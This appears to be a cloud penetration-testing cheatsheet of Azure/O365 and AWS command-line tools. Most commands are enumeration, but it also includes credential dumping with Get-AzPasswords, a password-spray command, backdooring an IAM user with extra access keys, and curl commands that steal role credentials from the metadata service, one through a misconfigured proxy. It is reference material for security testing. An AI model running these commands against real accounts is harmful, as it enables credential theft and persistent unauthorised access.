# Cloud Pen-testing Part -3

````markdown
## Microsoft Azure & O365 CLI Tool Cheatsheet (Part-3)

### Other Azure & O365 Tools

#### Look for open storage blobs

```powershell
Invoke-EnumerateAzureBlobs -Base $BaseName
````

**Export SSL/TLS certs**

```powershell
Get-AzPasswords -ExportCerts Y
```

**Azure Container Registry dump**

```powershell
Get-AzPasswords
Get-AzACR
```

**PowerZure**

Azure security assessment tool

[https://github.com/hausec/PowerZure](https://github.com/hausec/PowerZure)

**ROADTools**

Framework to interact with Azure AD

[https://github.com/dirkjanm/ROADtools](https://github.com/dirkjanm/ROADtools)

**Stormspotter**

Red team tool for graphing Azure and Azure AD objects

[https://github.com/Azure/Stormspotter](https://github.com/Azure/Stormspotter)

**MSOLSpray**

Tool to password spray Azure/O365

[https://github.com/dafthack](https://github.com/dafthack)

```powershell
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\userlist.txt -Password Spring2020
```

### Amazon Web Services (AWS) CLI Tool Cheatsheet

#### Authentication

```bash
# Set AWS programmatic keys for authentication (use --profile= for a new profile)
aws configure
```

#### Open S3 bucket enumeration

**List the contents of an S3 bucket**

```bash
aws s3 ls s3://<bucketname>/
```

**Download contents of a bucket**

```bash
aws s3 sync s3://bucketname s3-files-dir
```

#### Account Information

**Get basic account info**

```bash
aws sts get-caller-identity
```

**List IAM users**

```bash
aws iam list-users
```

**List IAM roles**

```bash
aws iam list-roles
```

**List S3 buckets accessible to an account**

```bash
aws s3 ls
```

#### Virtual Machines

**List EC2 instances**

```bash
aws ec2 describe-instances
```

#### WebApps & SQL

**List WebApps**

```bash
aws deploy list-applications
```

````markdown
### List AWS RDS (SQL)

```shell
aws rds describe-db-instances --region <region name>
````

#### Serverless

**List Lambda Functions**

```shell
aws lambda list-functions --region <region>
```

**Look at environment variables set for secrets and analyze code**

```shell
aws lambda get-function --function-name <lambda function>
```

#### Networking

**List EC2 subnets**

```shell
aws ec2 describe-subnets
```

**List EC2 network interfaces**

```shell
aws ec2 describe-network-interfaces
```

**List DirectConnect (VPN) connections**

```shell
aws directconnect describe-connections
```

#### Backdoors

**List access keys for a user**

```shell
aws iam list-access-keys --user-name <username>
```

**Backdoor account with a second set of access keys**

```shell
aws iam create-access-key --user-name <username>
```

#### Instance Metadata Service URL

```
http://169.254.169.254/latest/meta-data
```

**Additional IAM credentials possibly available here**

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM Role Name>
```

**Can potentially hit it externally if a proxy service (like Nginx) is being hosted in AWS and misconfigured**

```shell
curl --proxy vulndomain.target.com:80 http://169.254.169.254/latest/metadata/iam/security-credentials/ && echo
```

**IMDS Version 2 has some protections, but these commands can be used to access it**

```shell
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
```
